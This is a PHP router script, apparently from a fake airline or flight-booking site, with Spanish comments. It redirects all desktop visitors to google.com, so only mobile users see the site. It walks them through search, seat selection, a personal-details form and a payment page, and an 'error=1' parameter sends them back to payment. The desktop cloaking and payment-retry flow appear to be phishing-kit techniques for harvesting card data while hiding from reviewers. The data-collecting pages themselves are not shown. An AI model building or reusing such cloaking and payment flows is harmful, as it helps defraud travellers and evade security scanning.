<?php
// Primero, definimos la ruta base de forma segura.
define('PARTIALS_PATH', __DIR__ . '/partials/');

// --- Detección de Móvil ---
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$mobileKeywords = [
    'Mobi', 'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 
    'webOS', 'Windows Phone', 'Kindle', 'Opera Mini'
];
$isMobile = false;
foreach ($mobileKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isMobile = true;
        break;
    }
}

// Redirección si es PC (Esto debe ir ANTES de cualquier HTML)
if (!$isMobile) {
    header('Location: https://www.google.com');
    exit;
}

// --- Función segura para incluir archivos ---
// La usaremos para cargar todas las partes de la página.
function safe_include($file) {
    $path = PARTIALS_PATH . $file;
    
    if (file_exists($path)) {
        include $path;
    } else {
        // Si el archivo no se encuentra, mostramos un error claro.
        echo "<div style='background:red; color:white; padding:10px; font-family:sans-serif;'>";
        echo "<strong>Error Crítico:</strong> No se pudo encontrar el archivo: <code>" . htmlspecialchars($path) . "</code><br>";
        echo "Asegúrate de que la carpeta 'partials' y todos sus archivos .php estén subidos a tu repositorio de GitHub.";
        echo "</div>";
    }
}

// Ahora incluimos el header
safe_include('header.php');

// --- Lógica del Router ---
$step = isset($_GET['step']) ? $_GET['step'] : '';

if (isset($_GET['error']) && $_GET['error'] === '1') {
    safe_include('pago.php');
}
elseif ($step === 'pago') {
    safe_include('pago.php');
}
elseif ($step === 'form') {
    safe_include('form.php');
}
elseif ($step === 'seat') {
    safe_include('seleccion-asiento.php');
}
elseif (isset($_GET['origin'], $_GET['destination'], $_GET['departure-date'])) {
    safe_include('flight-results.php');
}
else {
    // Página de inicio por defecto
    safe_include('servicios.php');
    safe_include('flight-search.php');
    safe_include('viajes.php');
}
?>